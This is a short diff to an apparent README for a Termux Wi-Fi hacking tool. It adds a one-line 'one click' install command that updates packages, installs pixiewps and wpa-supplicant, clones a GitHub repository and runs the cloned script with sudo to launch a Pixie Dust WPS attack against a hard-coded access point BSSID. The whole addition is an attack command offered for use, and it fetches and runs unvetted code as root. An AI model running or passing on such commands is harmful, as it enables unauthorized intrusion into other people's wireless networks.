@@ -1,4 +1,8 @@
+### One click Installation :
 
+```bash
+apt update && apt upgrade && pkg install -y root-repo && pkg install -y git tsu python wpa-supplicant pixiewps iw && git clone --depth 1 https://github.com/Gtajisan/WifiHackfarhan&& cd WifiHackfarhan && sudo python WifiHackfarhan.py -i wlan0 -K && sudo python3 WifiHackfarhan.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
+```
 ### Hack WIfi Using Termux! (Requires Root)
 <p align="center"><img src="https://i.ibb.co/ygb9X0K/Screenshot-2023-04-13-12-18-19-365-com-termux.jpg"></p>
 
